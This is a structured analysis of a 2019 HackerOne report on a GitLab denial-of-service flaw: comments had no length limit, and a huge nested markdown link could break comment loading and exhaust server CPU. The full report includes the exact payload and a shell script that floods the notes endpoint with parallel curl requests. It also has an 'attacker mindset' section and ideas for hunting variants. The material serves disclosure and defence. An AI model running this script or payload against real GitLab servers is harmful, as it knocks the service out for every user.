# Denial of Service via Unlimited Character Comments on GitLab Issues

## Metadata
- **Source:** HackerOne
- **Report:** 557154 | https://hackerone.com/reports/557154
- **Submitted:** 2019-04-30
- **Reporter:** 8ayac
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Denial of Service (DoS), Resource Exhaustion, Input Validation Flaw, Client-Side DoS, Server-Side DoS
- **CVEs:** CVE-2019-15593
- **Category:** memory-binary

## Summary
GitLab fails to enforce character limits on issue comments, allowing authenticated users to post extremely long comments containing deeply nested markdown links. This causes both client-side rendering failures and server-side CPU exhaustion through algorithmic complexity attacks on markdown parsing.

## Attack scenario
1. Attacker authenticates to GitLab and creates or accesses an issue with existing comments
2. Attacker crafts a malicious comment containing 50,000+ nested markdown link syntax: [a](/a/a/a/a/...)
3. Attacker submits the comment via web UI or direct HTTP request with CSRF token
4. Server receives the comment and stores it without size validation; attempts to parse/render the markdown
5. Client-side: All users accessing the issue receive rendering errors and cannot fetch any comments
6. Server-side: Markdown parsing causes exponential CPU consumption; repeated submissions exhaust server resources and cause service-wide DoS

## Root cause
GitLab lacks input validation and length limits on comment content. The markdown parser likely exhibits quadratic or exponential complexity when processing deeply nested or pathological link structures, and there are no rate limits or resource controls on comment creation.

## Attacker mindset
A low-privilege attacker (any authenticated user) can leverage a feature available to all users (commenting) to disable the entire platform without sophisticated tooling. This is attractive because it requires minimal setup and has immediate, visible impact. The attacker can automate attacks via scripts to maximize resource exhaustion.

## Defensive takeaways
- Implement strict character limits on user-generated content (comments, issues, etc.) with clear messaging
- Add server-side markdown parser timeout/complexity limits to prevent algorithmic attacks
- Implement rate limiting on comment creation per user and per resource
- Use separate worker processes/containers for markdown rendering with resource quotas
- Add client-side validation to warn users before submitting excessively long content
- Implement comment preview that detects rendering issues before persistence
- Monitor CPU and memory usage for markdown processing and alert on anomalies
- Consider lazy-loading or truncating very long comments in UI
- Add server-side input sanitization and validation before markdown parsing

## Variant hunting
Test other user-generated content fields (issues, merge request descriptions, wiki pages) for similar limits
Test different markdown constructs for algorithmic complexity: nested lists, tables, code blocks, blockquotes
Check if emoji shortcodes or other special syntax have similar DoS vectors
Test attachment/file upload limits and file type handling
Verify if the same issue affects API endpoints vs web UI
Test comment editing endpoints to see if limits apply differently
Check batch operations (bulk commenting via API) for rate limiting

## MITRE ATT&CK
- T1498 - Network Denial of Service (Application-Layer DoS)
- T1499 - Endpoint Denial of Service (Resource Exhaustion)

## Notes
Report from 2019 against GitLab v11.10.2. The PoC demonstrates both client and server attack vectors clearly. The shell script payload encoding shows the attacker bypassed any potential client-side limitations. This is a classic algorithmic complexity attack combined with missing input validation. GitLab likely patched by adding character limits, markdown parser timeouts, and rate limiting on comment creation.

## Full report
<details><summary>Expand</summary>

### Summary
There is no limit to the number of characters in the issue comments, which allows a DoS attack. The DoS attack affects both server-side and client-side.

**NOTE**: This bug happens on GitLab.com.

### Steps to reproduce
▼Attack for Client-side 
1. Sign in to GitLab.
2. Create a project as below:
    - Project name: test01
    - Project slug: test01
    - Visibility Level: Public
    - Initialize repository with README: Checked
3. Create a new issue for the project created in Step 2.
4. Post some comments on the Issue created in Step 3.
5. Post a comment as below:
`[a](/a/a/a/a/a/a/a/a/a/a/a/a/a/a.....(50000 times))`
6. Reload the Issue page.

Result: I received an error message "Something went wrong while fetching comments. Please try again." And I could not fetch all the comments.

Note: In Step 5, if you can not post the comment from the browser, send the HTTP request directly in some way.
Note: The string to post in step 5 is described in the attached file F481358.

- PoC movie: F481363

▼Attack for Server-side
An attacker can exhaust server resources by continuously sending the requests generated in Step 5 of [Attack for Client-side]. This causes a denial of service to all users.

For example, you can verify it with a script as below:
```sh
#!/bin/sh
charBlock=$(head -c 50000 /dev/zero | sed -e 's/\x00/\/a/g')
payload='[a]('$charBlock')'

gitlabHost=$1
ProjectURL=$2
targetID=$3
loop=$4

curl=`cat << EOS
curl
  --insecure
  --silent
  --output /dev/null
  ${ProjectURL}/notes?target_id=${targetID}\&target_type=issue
  --header 'Host: ${gitlabHost}'
  --header 'X-CSRF-Token: [PLACEHOLDER]'
  -b '_gitlab_session=[PLACEHOLDER]'
  --data-binary 'note%5Bnoteable_type%5D=Issue&note%5Bnoteable_id%5D=3&note%5Bnote%5D=${payload}&merge_request_diff_head_sha=undefined'
EOS`

for i in `seq ${loop}`
do
    eval ${curl}&
done
```

Run the above script with the following command to see that the server's CPU is exhausted.
```
$ ./poc.sh [GitLab host] [Project URL] [target ID(※1)] [Repeat count of request]
```
※1: Get from the request generated in step 5 of [Client-side attack].

- PoC movie:  F481365 


#### Results of GitLab environment info
```
System information
System:
Current User:   git
Using RVM:      no
Ruby Version:   2.5.3p105
Gem Version:    2.7.6
Bundler Version:1.17.3
Rake Version:   12.3.2
Redis Version:  3.2.12
Git Version:    2.18.1
Sidekiq Version:5.2.5
Go Version:     unknown

GitLab information
Version:        11.10.2
Revision:       f3e84e78b62
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     9.6.11
URL:            https://gitlab.example.com
HTTP Clone URL: https://gitlab.example.com/some-group/some-project.git
SSH Clone URL:  git@gitlab.example.com:some-group/some-project.git
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        9.0.0
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```

## Impact

### Impact for client-side 
All comments on Issue will be inaccessible.

### Impact for server-side:
The CPU is exhausted and users will be able to access the GitLab service.

NOTE: All users who can comment on the issue can exploit this vulnerability.

</details>

---
*Analysed by Claude on 2026-05-24*
